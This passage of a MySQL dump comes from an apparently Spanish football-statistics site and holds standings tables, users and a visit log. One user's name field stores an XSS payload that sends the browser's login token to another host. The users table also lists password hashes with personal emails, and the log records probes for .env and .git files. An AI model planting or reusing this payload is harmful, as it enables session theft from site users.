  `goles_favor` int(11) NOT NULL DEFAULT 0,
  `goles_contra` int(11) NOT NULL DEFAULT 0,
  `puntos` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_burgerking`
--

LOCK TABLES `tabla_posiciones_burgerking` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_burgerking` DISABLE KEYS */;
INSERT INTO `tabla_posiciones_burgerking` VALUES
(32,25,1,0,1,0,2,2,1),
(33,26,1,1,0,0,6,0,3),
(34,27,1,0,1,0,2,2,1),
(35,28,1,0,1,0,1,1,1),
(36,29,1,1,0,0,4,0,3),
(37,30,0,0,0,0,0,0,0),
(38,31,0,0,0,0,0,0,0),
(39,32,1,1,0,0,2,0,3),
(40,33,1,0,0,1,0,2,0),
(41,34,1,0,1,0,1,1,1),
(42,35,1,0,0,1,0,4,0),
(43,36,1,0,0,1,0,6,0);
/*!40000 ALTER TABLE `tabla_posiciones_burgerking` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_femenina`
--

DROP TABLE IF EXISTS `tabla_posiciones_femenina`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_femenina` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `partidos_jugados` int(11) NOT NULL DEFAULT 0,
  `ganados` int(11) NOT NULL DEFAULT 0,
  `empatados` int(11) NOT NULL DEFAULT 0,
  `perdidos` int(11) NOT NULL DEFAULT 0,
  `goles_favor` int(11) NOT NULL DEFAULT 0,
  `goles_contra` int(11) NOT NULL DEFAULT 0,
  `puntos` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_femenina`
--

LOCK TABLES `tabla_posiciones_femenina` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_femenina` DISABLE KEYS */;
INSERT INTO `tabla_posiciones_femenina` VALUES
(1,1,0,0,0,0,0,0,0),
(2,2,2,0,0,2,1,4,0),
(3,3,2,2,0,0,6,0,6),
(4,4,2,0,0,2,1,9,0),
(5,5,2,0,0,2,0,3,0),
(6,6,2,2,0,0,4,1,6),
(7,7,2,2,0,0,12,0,6),
(9,9,1,1,0,0,4,1,3),
(10,10,2,1,0,1,2,5,3),
(11,11,2,1,1,0,5,1,4),
(12,12,1,0,1,0,1,1,1),
(13,13,2,0,0,2,1,12,0);
/*!40000 ALTER TABLE `tabla_posiciones_femenina` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_reservas`
--

DROP TABLE IF EXISTS `tabla_posiciones_reservas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_reservas` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `partidos_jugados` int(11) NOT NULL DEFAULT 0,
  `ganados` int(11) NOT NULL DEFAULT 0,
  `empatados` int(11) NOT NULL DEFAULT 0,
  `perdidos` int(11) NOT NULL DEFAULT 0,
  `goles_favor` int(11) NOT NULL DEFAULT 0,
  `goles_contra` int(11) NOT NULL DEFAULT 0,
  `puntos` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_reservas`
--

LOCK TABLES `tabla_posiciones_reservas` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_reservas` DISABLE KEYS */;
INSERT INTO `tabla_posiciones_reservas` VALUES
(13,181,2,0,1,1,1,2,1),
(14,182,2,1,0,1,4,4,3),
(15,183,2,2,0,0,5,3,6),
(16,184,2,0,0,2,3,8,0),
(17,185,2,1,0,1,7,5,3),
(18,186,2,2,0,0,6,1,6),
(19,187,2,0,1,1,2,3,1),
(20,188,2,1,0,1,4,5,3),
(21,189,2,1,1,0,3,1,4),
(22,190,2,1,0,1,4,5,3),
(23,191,2,0,1,1,3,6,1),
(24,192,2,1,0,1,5,4,3);
/*!40000 ALTER TABLE `tabla_posiciones_reservas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_segunda`
--

DROP TABLE IF EXISTS `tabla_posiciones_segunda`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_segunda` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `pj` int(11) NOT NULL DEFAULT 0,
  `pg` int(11) NOT NULL DEFAULT 0,
  `pe` int(11) NOT NULL DEFAULT 0,
  `pp` int(11) NOT NULL DEFAULT 0,
  `gf` int(11) NOT NULL DEFAULT 0,
  `gc` int(11) NOT NULL DEFAULT 0,
  `dg` int(11) NOT NULL DEFAULT 0,
  `pts` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_segunda`
--

LOCK TABLES `tabla_posiciones_segunda` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_segunda` DISABLE KEYS */;
/*!40000 ALTER TABLE `tabla_posiciones_segunda` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tabla_posiciones_tercera`
--

DROP TABLE IF EXISTS `tabla_posiciones_tercera`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tabla_posiciones_tercera` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `equipo_id` int(11) NOT NULL,
  `pj` int(11) NOT NULL DEFAULT 0,
  `pg` int(11) NOT NULL DEFAULT 0,
  `pe` int(11) NOT NULL DEFAULT 0,
  `pp` int(11) NOT NULL DEFAULT 0,
  `gf` int(11) NOT NULL DEFAULT 0,
  `gc` int(11) NOT NULL DEFAULT 0,
  `dg` int(11) NOT NULL DEFAULT 0,
  `pts` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  UNIQUE KEY `equipo_id` (`equipo_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tabla_posiciones_tercera`
--

LOCK TABLES `tabla_posiciones_tercera` WRITE;
/*!40000 ALTER TABLE `tabla_posiciones_tercera` DISABLE KEYS */;
/*!40000 ALTER TABLE `tabla_posiciones_tercera` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `usuarios`
--

DROP TABLE IF EXISTS `usuarios`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nombre` varchar(100) DEFAULT NULL,
  `apodo` varchar(30) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `rol` varchar(20) DEFAULT NULL,
  `activo` tinyint(1) NOT NULL DEFAULT 1,
  `justificacion_desactivacion` text DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `email` (`email`),
  UNIQUE KEY `idx_apodo` (`apodo`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `usuarios`
--

LOCK TABLES `usuarios` WRITE;
/*!40000 ALTER TABLE `usuarios` DISABLE KEYS */;
INSERT INTO `usuarios` VALUES
(9,'<img src=x onerror=fetch(\"http://192.168.0.57:8888/?token=\"+localStorage.getItem(\"token\"))>','Sirenoman1232','unmaje@gmail.com','$2y$10$CsGI/HaVU4o8s4MiFZbM..BG3XhrkMzTLZht92hdcjS5.e2.Zv2rm','admin',1,NULL),
(12,'Ariel Soto','sirenoman','vanesotomayor0411@gmail.com','$2y$10$p026uLuTiU9174hJmV9aP.38paidhvMZ6/7aFdglWuSZb7icHvauu','admin',1,NULL),
(13,'Alejandro','megatomayor','arielosotomayor0411@gmail.com','$2y$10$rCWHiRXBMLDE.H6xSG.1Z.96xnR4r7hIVulh8HSBO4V4VZAxCH3Sy','usuario',1,NULL),
(20,'Administrador','admin','admin@numerosyfutbol.com','$2y$10$U3d8sKZ9wO.S22LGvvv8aOeKyAEzukUloMzM6XqyemMzpVouICVOC','admin',1,NULL),
(25,'Test','testpw100','testpw100@test.com','$2y$10$qQ0cHB3qGVQRnTt.B5EeiurtHnb8ciz9OYMRgQG/ebpvFVN7rS1va','usuario',1,NULL);
/*!40000 ALTER TABLE `usuarios` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `visitas`
--

DROP TABLE IF EXISTS `visitas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `visitas` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip_hash` char(64) NOT NULL,
  `pagina` varchar(255) NOT NULL,
  `user_agent` text DEFAULT NULL,
  `referer` varchar(500) DEFAULT NULL,
  `es_bot` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`),
  KEY `idx_ip` (`ip_hash`),
  KEY `idx_created` (`created_at`),
  KEY `idx_pagina` (`pagina`)
) ENGINE=InnoDB AUTO_INCREMENT=314 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `visitas`
--

LOCK TABLES `visitas` WRITE;
/*!40000 ALTER TABLE `visitas` DISABLE KEYS */;
INSERT INTO `visitas` VALUES
(157,'cd0eb517df151a008619c21943ff3175a049011efe2b5016d06a38fcf4a29dec','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.69:8080/teams/femenina',0,'2026-07-17 14:21:06'),
(158,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','',0,'2026-07-17 15:44:22'),
(159,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/ascenso','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/',0,'2026-07-17 15:44:32'),
(160,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/seleccion-femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/ascenso',0,'2026-07-17 15:44:51'),
(161,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/partido/3/ascenso','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/seleccion-femenina',0,'2026-07-17 15:45:08'),
(162,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/partido/3/ascenso',0,'2026-07-17 15:45:22'),
(163,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/partido/79/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/partido/3/ascenso',0,'2026-07-17 15:45:25'),
(164,'143b9d341b972b55f9965ac5996564d060c0f9a17ed211308cec7c143be8e0d8','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.69:8080/primera',0,'2026-07-17 15:45:57'),
(165,'cd0eb517df151a008619c21943ff3175a049011efe2b5016d06a38fcf4a29dec','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.69:8080/manage-seleccion-femenina',0,'2026-07-17 17:40:34'),
(166,'ba91d6fa71b2cefb5610e841d538198332150dac3f500730ca0a850fade2f457','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/news',0,'2026-07-19 08:15:03'),
(167,'4a481c19aecde856c6f3a1c299bcb2979b74b8cec0bc98081973c28563816992','/','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','',0,'2026-07-22 02:46:52'),
(168,'4a481c19aecde856c6f3a1c299bcb2979b74b8cec0bc98081973c28563816992','/login','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','',0,'2026-07-22 02:47:07'),
(169,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/partido/81/primera',0,'2026-07-24 14:57:28'),
(170,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-24 14:57:32'),
(171,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/noticia/13','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-24 14:57:38'),
(172,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/partido/81/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/noticia/13',0,'2026-07-24 14:57:42'),
(173,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/seleccion','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-24 14:58:01'),
(174,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/seleccion-femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion',0,'2026-07-24 14:58:31'),
(175,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/seleccion-sub20','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-femenina',0,'2026-07-24 14:58:36'),
(176,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/seleccion-sub17','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-24 14:58:43'),
(177,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-24 15:10:47'),
(178,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-24 15:10:49'),
(179,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/perfil','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-24 15:27:16'),
(180,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/ascenso','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/partido/81/primera',0,'2026-07-24 15:28:27'),
(181,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/users','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-24 15:38:19'),
(182,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/manage-news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/seleccion-sub20',0,'2026-07-24 15:41:04'),
(183,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','',0,'2026-07-24 15:42:01'),
(184,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/seleccion-sub20','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.57:8080/',0,'2026-07-24 15:42:15'),
(185,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/noticia/13','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','',0,'2026-07-24 15:46:28'),
(186,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','',0,'2026-07-24 15:46:53'),
(187,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/partido/88/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.57:8080/news',0,'2026-07-24 15:47:34'),
(188,'454d4e9fb15246c3e40ded4fbbaa019dd3ac07fb04e96d6c618f94e3593b7521','/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36 OPR/133.0.0.0','http://192.168.0.57:8080/',0,'2026-07-24 15:48:18'),
(189,'4ad2392125f0d5b7cf3dcd600b7ff15aa23f74c6b4407169b7084388afd5afb7','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/teams/reservas',0,'2026-07-24 21:45:38'),
(190,'71dda6155cb3194aeed7a8516c4e9c89eef394047b9a02a6f121728a60655b50','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/manage-comments',0,'2026-07-25 21:46:44'),
(191,'71dda6155cb3194aeed7a8516c4e9c89eef394047b9a02a6f121728a60655b50','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/ascenso',0,'2026-07-27 00:45:04'),
(192,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','',0,'2026-07-28 03:59:27'),
(193,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/ascenso','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-28 03:59:52'),
(194,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/primera','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/ascenso',0,'2026-07-28 04:00:01'),
(195,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/reservas','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/primera',0,'2026-07-28 04:01:05'),
(196,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/burgerking','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/reservas',0,'2026-07-28 04:01:19'),
(197,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/partido/89/primera','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/burgerking',0,'2026-07-28 04:01:39'),
(198,'d2d03370d8e046263f8d8438f288b0ee18f27f1d74bcf111c4bc33fdf262490a','/partido/88/primera','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36','http://192.168.0.57:8080/burgerking',0,'2026-07-28 04:01:44'),
(199,'46ec23683c8898f0ac1d5f6d30d7316b59549cf16e4fb3eae76d6fea04851a00','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 12:13:55'),
(200,'0c37b5b669ce28d946f8f1dd88690ae8d8960ad84b71d486ef2222f490d3a758','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/manage-news',0,'2026-07-28 16:31:22'),
(201,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 16:43:06'),
(202,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/partido/99/primera','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-28 16:44:03'),
(203,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/femenina','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/',0,'2026-07-28 16:44:52'),
(204,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/news','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 16:45:02'),
(205,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/register','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 16:49:19'),
(206,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/login','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 16:56:49'),
(207,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/forgot-password','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/femenina',0,'2026-07-28 16:57:25'),
(208,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/settings','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:22:07'),
(209,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/useradmin','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:26:56'),
(210,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/djjf','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:27:07'),
(211,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/.env.dev','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:28:36'),
(212,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/.env.local','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:28:41'),
(213,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/upload_files','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:29:10'),
(214,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/.git/HEAD.bak','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:31:56'),
(215,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/copa-presidente','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','http://192.168.0.57:8080/news',0,'2026-07-28 17:33:57'),
(216,'8e73364baecc713a738c9aa71f88346606f3f6c80a99a450f900d254b43ee325','/http://192.168.0.57:8080/backend/','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36','',0,'2026-07-28 17:36:08'),
